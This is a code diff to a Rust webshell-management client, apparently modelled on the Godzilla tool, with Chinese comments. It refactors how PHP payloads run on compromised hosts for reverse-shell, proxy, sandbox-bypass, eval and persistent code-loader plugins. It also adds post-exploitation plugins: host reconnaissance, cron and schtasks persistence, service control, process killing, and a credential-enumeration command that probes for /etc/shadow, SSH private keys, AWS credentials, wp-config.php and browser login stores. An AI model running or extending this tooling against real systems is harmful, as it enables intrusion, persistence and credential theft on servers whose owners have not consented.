@@ -83,6 +83,18 @@ fn validate_path_arg(path: &str) -> Result<(), String> {
     Ok(())
 }
 
+/// 执行 PHP 载荷并解析 JSON 结果（与 bypass.rs 的 run_payload 同构）。
+pub(crate) fn run_payload(
+    protocol: &dyn Protocol,
+    session: &dyn SessionState,
+    code: &str,
+    settings: &AppSettings,
+) -> Result<serde_json::Value, ProtocolError> {
+    let output = protocol.run_code(session, "php", code, settings)?;
+    serde_json::from_str(&output)
+        .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+}
+
 fn run_command(
     protocol: &dyn Protocol,
     session: &dyn SessionState,
@@ -151,10 +163,8 @@ echo json_encode(array('ok' => true, 'data' => array(
     'rows' => $rows,
 )));
 "#;
-                let output = protocol.run_code(session, "php", code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
-            }
+                run_payload(protocol, session, &code, settings)
+                }
             other => run_command(protocol, session, process_command(other), settings),
         }
     }
@@ -247,9 +257,7 @@ impl FeaturePlugin for PortScanPlugin {
             "php" => {
                 let code = php_port_scan_code(&host, &ports, timeout);
                 let output = protocol.run_code(session, "php", &code, settings)?;
-                let parsed: serde_json::Value = serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))?;
-                Ok(parsed)
+                run_payload(protocol, session, &code, settings)
             }
             // 非 PHP：命令型 /dev/tcp 扫描（Linux 环境）
             _other => {
@@ -329,9 +337,7 @@ impl FeaturePlugin for PhpEnvPlugin {
                 "PHP 环境检测仅支持 php 运行时（当前 {runtime}）"
             )));
         }
-        let output = protocol.run_code(session, "php", php_env_code(), settings)?;
-        serde_json::from_str(&output)
-            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+        run_payload(protocol, session, &php_env_code(), settings)
     }
 }
 
@@ -413,9 +419,7 @@ impl FeaturePlugin for ZipPlugin {
         match language {
             "php" => {
                 let code = php_zip_code(&source, &target);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             // 非 PHP：系统 zip 命令（zip 可用时）
             _other => {
@@ -508,9 +512,7 @@ impl FeaturePlugin for RemoteDownloadPlugin {
                 let url = param_str(params, "url", "");
                 let target = param_str(params, "target", "/tmp/downloaded");
                 let code = php_remote_download_code(&url, &target);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "远程下载暂不支持运行时 {other}"
@@ -642,9 +644,7 @@ impl FeaturePlugin for WebShellScanPlugin {
                 let dir = param_str(params, "dir", ".");
                 let depth = param_int(params, "max_depth", 4).clamp(1, 8);
                 let code = php_webshell_scan_code(&dir, depth);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "WebShell 扫描暂不支持运行时 {other}"
@@ -716,9 +716,7 @@ impl FeaturePlugin for SuperTerminalPlugin {
                 // 交互式 PTY 反弹（linpty）：script 分配 PTY → su 可用
                 let background = param_bool(params, "background", true);
                 let code = php_reverse_shell_code(&host, port, "/bin/bash", true, background);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "交互式终端暂不支持运行时 {other}"
@@ -785,9 +783,7 @@ impl FeaturePlugin for EvalCodePlugin {
         }
         let code = param_str(params, "code", "echo 'hello';");
         let payload = php_eval_code(&code);
-        let output = protocol.run_code(session, "php", &payload, settings)?;
-        serde_json::from_str(&output)
-            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+        run_payload(protocol, session, &payload, settings)
     }
 }
 
@@ -860,9 +856,7 @@ impl FeaturePlugin for RealCmdPlugin {
                 let shell = param_str(params, "shell", "/bin/bash");
                 let background = param_bool(params, "background", true);
                 let code = php_reverse_shell_code(&host, port, &shell, false, background);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "反弹 Shell 暂不支持运行时 {other}"
@@ -1070,9 +1064,7 @@ impl FeaturePlugin for SocksProxyPlugin {
                 let window = param_int(params, "window", 600).clamp(30, 3600);
                 let action = param_str(params, "action", "start");
                 let code = php_socks_proxy_code(port, window, &action);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "Socks 代理暂不支持运行时 {other}"
@@ -1247,9 +1239,7 @@ impl FeaturePlugin for HttpProxyPlugin {
                 let window = param_int(params, "window", 600).clamp(30, 3600);
                 let action = param_str(params, "action", "start");
                 let code = php_http_proxy_code(port, window, &action);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "HTTP 代理暂不支持运行时 {other}"
@@ -1469,9 +1459,7 @@ impl FeaturePlugin for BypassOpenBasedirPlugin {
         let recursive = param_bool(params, "recursive", false);
         let write_data = param_str(params, "write_data", "");
         let code = php_bypass_open_basedir_code(&target, &method, recursive, &write_data);
-        let output = protocol.run_code(session, "php", &code, settings)?;
-        serde_json::from_str(&output)
-            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+        run_payload(protocol, session, &code, settings)
     }
 }
 
@@ -1664,9 +1652,7 @@ impl FeaturePlugin for BypassDisableFunctionsPlugin {
         }
         let command = param_str(params, "command", "id");
         let code = php_bypass_disable_functions_code(&command);
-        let output = protocol.run_code(session, "php", &code, settings)?;
-        serde_json::from_str(&output)
-            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+        run_payload(protocol, session, &code, settings)
     }
 }
 
@@ -1775,9 +1761,7 @@ impl FeaturePlugin for FileSearchPlugin {
                 let in_content = param_bool(params, "in_content", false);
                 let depth = param_int(params, "max_depth", 4).clamp(1, 8);
                 let code = php_file_search_code(&dir, &keyword, in_content, depth);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "文件搜索暂不支持运行时 {other}"
@@ -1971,9 +1955,7 @@ impl FeaturePlugin for CryptoToolPlugin {
                 let text = param_str(params, "text", "");
                 let pass = param_str(params, "pass", "");
                 let code = php_crypto_tool_code(&op, &algorithm, &text, &pass);
-                let output = protocol.run_code(session, "php", &code, settings)?;
-                serde_json::from_str(&output)
-                    .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+                run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "加解密工具暂不支持运行时 {other}"
@@ -2059,8 +2041,321 @@ impl FeaturePlugin for CodeLoaderPlugin {
         let code = param_str(params, "code", "echo 'loaded';");
         let persist = param_str(params, "persist_path", "");
         let payload = php_code_loader_code(&code, &persist);
-        let output = protocol.run_code(session, "php", &payload, settings)?;
-        serde_json::from_str(&output)
-            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+        run_payload(protocol, session, &payload, settings)
     }
 }
+
+// ---------------------------------------------------------------------------
+// 哥斯拉风格工具插件：系统信息 / 计划任务 / 服务管理 / 进程结束 / 凭据枚举
+// ---------------------------------------------------------------------------
+
+/// 系统信息命令（按语言选择：CPU / 内存 / 磁盘 / 负载 / 运行时间）。
+fn sysinfo_command(language: &str) -> &'static str {
+    match language {
+        "aspnet" => {
+            "systeminfo 2>nul & echo ===DISK=== & wmic logicaldisk get caption,size,freespace 2>nul & echo ===CPU=== & wmic cpu get name 2>nul"
+        }
+        _ => {
+            "echo ===HOST===; hostname 2>/dev/null; uname -a 2>/dev/null; echo ===CPU===; lscpu 2>/dev/null | head -14 || grep -m1 'model name' /proc/cpuinfo; echo ===MEM===; free -h 2>/dev/null || head -4 /proc/meminfo; echo ===DISK===; df -h 2>/dev/null; echo ===LOAD===; cat /proc/loadavg 2>/dev/null; uptime 2>/dev/null; echo ===NET===; ip -4 addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet; echo ===USER===; whoami; id 2>/dev/null"
+        }
+    }
+}
+
+/// 系统信息（通用）：主机/CPU/内存/磁盘/负载/网络/用户。
+pub struct SysinfoPlugin;
+
+impl FeaturePlugin for SysinfoPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "sysinfo".into(),
+            name: "系统信息".into(),
+            version: "1.0.0".into(),
+            description: "采集主机/CPU/内存/磁盘/负载/网络/用户信息（哥斯拉系统信息同款）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        _params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        run_command(protocol, session, sysinfo_command(runtime), settings)
+    }
+}
+
+/// 计划任务命令（按语言与动作选择）。
+fn task_command(language: &str, action: &str, name: &str, cron: &str, command: &str) -> String {
+    match language {
+        "aspnet" => match action {
+            "list" => "schtasks /query /fo CSV /v 2>nul".to_string(),
+            "add" => format!(
+                "schtasks /create /tn \"{name}\" /tr \"{command}\" /sc MINUTE /mo 1 /f 2>&1"
+            ),
+            "delete" => format!("schtasks /delete /tn \"{name}\" /f 2>&1"),
+            "run" => format!("schtasks /run /tn \"{name}\" 2>&1"),
+            _ => String::new(),
+        },
+        _ => match action {
+            "list" => {
+                "crontab -l 2>/dev/null || echo 'crontab empty'; echo ===SYS===; ls -la /etc/cron.d/ 2>/dev/null | head -20".to_string()
+            }
+            "add" => {
+                format!(
+                    "(crontab -l 2>/dev/null; echo \"{cron} {command}\") | crontab - 2>&1 && crontab -l"
+                )
+            }
+            "delete" => {
+                format!("crontab -l 2>/dev/null | grep -v -F \"{command}\" | crontab - 2>&1 && crontab -l")
+            }
+            "run" => format!("{command} 2>&1"),
+            _ => String::new(),
+        },
+    }
+}
+
+/// 计划任务（通用）：Linux crontab / Windows schtasks 查看、添加、删除。
+pub struct TaskSchedulerPlugin;
+
+impl FeaturePlugin for TaskSchedulerPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "task_scheduler".into(),
+            name: "计划任务".into(),
+            version: "1.0.0".into(),
+            description: "查看/添加/删除计划任务（Linux crontab；Windows schtasks）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "action".into(),
+                    label: "操作".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("list")),
+                    options: Some(vec![
+                        "list".to_string(),
+                        "add".to_string(),
+                        "delete".to_string(),
+                        "run".to_string(),
+                    ]),
+                },
+                ParamSpec {
+                    name: "name".into(),
+                    label: "任务名（Windows）".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("dosword_task")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "cron".into(),
+                    label: "Cron 表达式（Linux add）".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("*/5 * * * *")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "command".into(),
+                    label: "执行命令".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("/bin/sh -c 'id > /tmp/.dsw_cron.log'")),
+                    options: None,
+                },
+            ],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        let action = param_str(params, "action", "list");
+        let name = param_str(params, "name", "dosword_task");
+        let cron = param_str(params, "cron", "*/5 * * * *");
+        let command = param_str(params, "command", "/bin/sh -c 'id'");
+        run_command(
+            protocol,
+            session,
+            &task_command(runtime, &action, &name, &cron, &command),
+            settings,
+        )
+    }
+}
+
+/// 服务管理命令（按语言与动作选择）。
+fn service_command(language: &str, action: &str, name: &str) -> String {
+    match language {
+        "aspnet" => match action {
+            "list" => "sc query state= all 2>nul | findstr /C:\"SERVICE_NAME\" /C:\"STATE\" 2>nul || net start 2>nul".to_string(),
+            "status" => format!("sc query \"{name}\" 2>&1"),
+            "start" => format!("sc start \"{name}\" 2>&1"),
+            "stop" => format!("sc stop \"{name}\" 2>&1"),
+            "restart" => format!("sc stop \"{name}\" 2>&1 & timeout /t 2 >nul & sc start \"{name}\" 2>&1"),
+            _ => String::new(),
+        },
+        _ => match action {
+            "list" => "systemctl list-units --type=service --no-pager 2>/dev/null | head -40 || service --status-all 2>/dev/null".to_string(),
+            "status" => format!("systemctl status {name} --no-pager 2>&1 | head -20 || service {name} status 2>&1"),
+            "start" => format!("systemctl start {name} 2>&1; echo exit=$?"),
+            "stop" => format!("systemctl stop {name} 2>&1; echo exit=$?"),
+            "restart" => format!("systemctl restart {name} 2>&1; echo exit=$?"),
+            _ => String::new(),
+        },
+    }
+}
+
+/// 服务管理（通用）：systemctl / service / sc 查看状态、启动、停止、重启。
+pub struct ServiceCtlPlugin;
+
+impl FeaturePlugin for ServiceCtlPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "service_ctl".into(),
+            name: "服务管理".into(),
+            version: "1.0.0".into(),
+            description: "查看/启动/停止/重启服务（systemctl / service / sc）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "action".into(),
+                    label: "操作".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("list")),
+                    options: Some(vec![
+                        "list".to_string(),
+                        "status".to_string(),
+                        "start".to_string(),
+                        "stop".to_string(),
+                        "restart".to_string(),
+                    ]),
+                },
+                ParamSpec {
+                    name: "name".into(),
+                    label: "服务名".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("nginx")),
+                    options: None,
+                },
+            ],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        let action = param_str(params, "action", "list");
+        let name = param_str(params, "name", "nginx");
+        run_command(
+            protocol,
+            session,
+            &service_command(runtime, &action, &name),
+            settings,
+        )
+    }
+}
+
+/// 结束进程命令（按语言）。
+fn kill_command(language: &str, pid: &str) -> String {
+    match language {
+        "aspnet" => format!("taskkill /F /PID {pid} 2>&1"),
+        _ => format!("kill -9 {pid} 2>&1; echo exit=$?"),
+    }
+}
+
+/// 进程结束（通用）：按 PID 强制结束进程。
+pub struct ProcessKillPlugin;
+
+impl FeaturePlugin for ProcessKillPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "process_kill".into(),
+            name: "结束进程".into(),
+            version: "1.0.0".into(),
+            description: "按 PID 强制结束目标进程（kill -9 / taskkill /F）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![ParamSpec {
+                name: "pid".into(),
+                label: "进程 PID".into(),
+                param_type: "string".into(),
+                default: Some(serde_json::json!("")),
+                options: None,
+            }],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        let pid = param_str(params, "pid", "");
+        if pid.is_empty() || !pid.chars().all(|c| c.is_ascii_digit()) {
+            return Err(ProtocolError::NotSupported("PID 必须为数字".into()));
+        }
+        run_command(protocol, session, &kill_command(runtime, &pid), settings)
+    }
+}
+
+/// 凭据枚举命令（按语言：常见凭据/敏感文件存在性检查——仅枚举不提取内容）。
+fn cred_command(language: &str) -> &'static str {
+    match language {
+        "aspnet" => {
+            "echo ===USERS===; net user 2>nul; echo ===CREDS===; for %f in (\"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" \"%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\logins.json\" \"%USERPROFILE%\\.ssh\\id_rsa\" \"%WINDIR%\\repair\\SAM\") do @if exist %f echo FOUND: %f"
+        }
+        _ => {
+            "echo ===USERS===; cat /etc/passwd 2>/dev/null | cut -d: -f1,3,6 | head -30; echo ===CREDS===; for f in /root/.ssh/id_rsa /home/*/.ssh/id_rsa /etc/shadow /var/www/html/wp-config.php /etc/mysql/my.cnf /root/.my.cnf ~/.aws/credentials ~/.config/google-chrome/Default/LoginData ~/.mozilla/firefox/*/logins.json; do [ -f \"$f\" ] && echo \"FOUND: $f\"; done"
+        }
+    }
+}
+
+/// 凭据枚举（通用）：常见凭据/敏感文件存在性检查（仅枚举路径，不提取内容）。
+pub struct CredScanPlugin;
+
+impl FeaturePlugin for CredScanPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "cred_scan".into(),
+            name: "凭据枚举".into(),
+            version: "1.0.0".into(),
+            description: "枚举常见凭据/敏感文件（ssh key、密码库、配置）存在性——仅检查不读取内容。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        _params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        run_command(protocol, session, cred_command(runtime), settings)
+    }
+}
+
